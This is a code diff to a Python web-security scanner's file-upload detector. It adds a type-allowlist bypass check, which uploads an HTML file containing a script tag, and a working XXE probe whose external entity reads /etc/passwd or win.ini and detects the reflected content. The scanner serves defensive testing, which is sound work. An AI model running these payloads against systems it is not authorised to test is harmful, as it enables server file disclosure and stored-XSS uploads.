@@ -332,6 +332,82 @@ class FileUploadDetector(BaseDetector):
         # --- Test 6: XML entity-parser differential (bounded, safe) ---
         await self._test_xml_parser(client, findings, candidate)
 
+        # --- Test 7: real XXE — external entity file disclosure (reflected) ---
+        await self._test_xxe_external_entity(client, findings, candidate)
+
+        # --- Test 8: type-allowlist bypass (accept-differential, no retrieval) ---
+        # A secure upload endpoint enforces a type allowlist and REJECTS dangerous
+        # active-content / executable types. When a benign allowed type AND a
+        # dangerous active-content type are accepted IDENTICALLY, the endpoint
+        # applies no server-side file-type validation (CWE-434) — a real weakness
+        # even when the stored file is never served back (so Tests 1-5, which all
+        # require retrieval/execution to confirm, stay silent).
+        #
+        # Zero-FP anchor: we ALSO require the endpoint to REJECT an oversized upload.
+        # That proves it runs real server-side upload validation (a size guard), so
+        # accepting the dangerous type is a genuine gap — not a permissive stub that
+        # merely echoes 2xx to everything (which we cannot distinguish from a real
+        # handler and must not flag). Framework-agnostic: keyed on the accept/reject
+        # differential, never on a target path.
+        already_flagged = any(
+            f.url == form_url
+            and f.vuln_type in {
+                "Unrestricted File Upload",
+                "Missing File Type Validation",
+                "Weak File Upload Validation",
+            }
+            for f in findings
+        )
+        if not already_flagged:
+            benign_ok, benign_resp = await self._send_upload(
+                client, candidate, "sentry_ok.pdf", b"%PDF-1.4\n%sentry benign\n", "application/pdf",
+            )
+            danger_name = "sentry_active.html"
+            danger_ok, danger_resp = await self._send_upload(
+                client, candidate, danger_name,
+                b"<!doctype html><script>/*SENTRY_UPLOAD_TYPE*/</script>", "text/html",
+            )
+            # A file large enough to trip any reasonable size guard. A validating
+            # handler rejects it; a blind accept-everything stub does not.
+            oversize_ok, _oversize_resp = await self._send_upload(
+                client, candidate, "sentry_big.pdf", b"%PDF-1.4\n" + b"A" * (512 * 1024), "application/pdf",
+            )
+            if (
+                benign_ok
+                and danger_ok
+                and benign_resp.status_code == danger_resp.status_code
+                and not oversize_ok
+            ):
+                findings.append(Finding(
+                    category=OwaspCategory.a01,
+                    vuln_type="Missing File Type Validation",
+                    severity=SeverityLevel.medium,
+                    url=form_url,
+                    parameter=file_field,
+                    method=method,
+                    payload=danger_name,
+                    evidence=(
+                        "Upload endpoint enforces server-side validation (an oversized upload was "
+                        "rejected) but applies NO file-type allowlist: a benign 'application/pdf' file "
+                        "and a dangerous active-content 'text/html' file were both accepted with an "
+                        f"identical HTTP {danger_resp.status_code} response (CWE-434). If such an upload "
+                        "is later served from this origin it enables stored XSS or code execution; "
+                        "storage/retrieval was not confirmed here."
+                    ),
+                    confidence_score=70.0,
+                    detection_method="upload_type_allowlist_bypass_differential",
+                    detection_evidence={
+                        "benign_content_type": "application/pdf",
+                        "benign_status": benign_resp.status_code,
+                        "dangerous_content_type": "text/html",
+                        "dangerous_status": danger_resp.status_code,
+                        "oversize_rejected": True,
+                        "retrieval_confirmed": False,
+                    },
+                    reproducible=True,
+                    verified=True,
+                ))
+
     # A bounded, entirely internal XML entity. There is NO external reference
     # (no SYSTEM/http/file) and NO recursive expansion, so it can never cause an
     # SSRF, file read, or billion-laughs blow-up — it only reveals whether the
@@ -345,6 +421,19 @@ class FileUploadDetector(BaseDetector):
     _XML_CONTROL_DOC = (
         '<?xml version="1.0"?><sentry>SENTRY_XML_CONTROL</sentry>'
     ).encode()
+
+    # External-entity (real XXE) probes. Each references a benign, universally
+    # present read-only OS file; the signature is content that appears ONLY when
+    # the parser resolves the external entity and reflects it — never in our own
+    # payload — so a match is undeniable proof of arbitrary file disclosure (zero
+    # false positive). Read-only and bounded (one small doc per probe). No SSRF,
+    # no write, no recursion. Covers the two dominant server OS families so the
+    # check is target-agnostic (a Linux or Windows backend each has one hit).
+    _XXE_CANARY = "SENTRY_XXE_EXT"
+    _XXE_EXTERNAL_PROBES = (
+        ("file:///etc/passwd", re.compile(r"root:.*?:0:0:", re.I)),
+        ("file:///c:/windows/win.ini", re.compile(r"\[(?:extensions|fonts|mci extensions)\]", re.I)),
+    )
 
     # Tokens that mark an endpoint as a likely document/data parser rather than a
     # plain image/avatar upload. Deliberately excludes the ubiquitous
@@ -492,6 +581,70 @@ class FileUploadDetector(BaseDetector):
                 reproducible=False,
                 verified=False,
             ))
+
+    async def _test_xxe_external_entity(
+        self,
+        client: httpx.AsyncClient,
+        findings: list[Finding],
+        candidate: UploadCandidate,
+    ) -> None:
+        """Upload an XML doc with an EXTERNAL entity and detect reflected file read.
+
+        This is the genuine XXE test (distinct from ``_test_xml_parser``, which
+        uses an internal-only entity to detect mere entity expansion). Each probe
+        references a benign read-only OS file via a ``file://`` SYSTEM entity; the
+        finding fires ONLY when the referenced file's content is reflected in the
+        response, which is undeniable proof the parser resolved the external
+        entity and disclosed a server-side file. Fires on any upload candidate
+        (an XML sink may be reached even through a field named ``file``); the
+        reflection requirement makes it zero-FP on endpoints that ignore the XML
+        or strip entities, so no parser-token gate is needed. Bounded, read-only,
+        non-destructive.
+        """
+        for uri, signature in self._XXE_EXTERNAL_PROBES:
+            doc = (
+                '<?xml version="1.0" encoding="UTF-8"?>'
+                f'<!DOCTYPE sentry [<!ENTITY xxe SYSTEM "{uri}">]>'
+                f"<sentry><probe>{self._XXE_CANARY}&xxe;</probe></sentry>"
+            ).encode()
+            try:
+                _accepted, response = await self._send_upload(
+                    client, candidate, "sentry_xxe.xml", doc, "application/xml",
+                )
+            except Exception:
+                continue
+            body = response.text or ""
+            match = signature.search(body)
+            # The signature is reflected file content, never present in our
+            # payload — any match proves external-entity resolution + disclosure.
+            if not match:
+                continue
+            disclosed = body[match.start(): match.start() + 80]
+            findings.append(Finding(
+                category=OwaspCategory.a05,
+                vuln_type="XML External Entity (XXE) Injection",
+                severity=SeverityLevel.high,
+                url=candidate.url,
+                parameter=candidate.file_field,
+                method=candidate.method,
+                payload="sentry_xxe.xml",
+                evidence=(
+                    "Uploaded XML with an external SYSTEM entity "
+                    f"({uri}) was resolved server-side and the referenced file's "
+                    "content was reflected in the response — arbitrary file "
+                    f"disclosure via XXE. Disclosed content: {disclosed!r}."
+                ),
+                confidence_score=95.0,
+                detection_method="xxe_external_entity_file_read",
+                detection_evidence={
+                    "entity_uri": uri,
+                    "reflected_file_content": disclosed,
+                    "file_disclosed": True,
+                },
+                reproducible=True,
+                verified=True,
+            ))
+            return
 
     async def _send_upload(
         self,
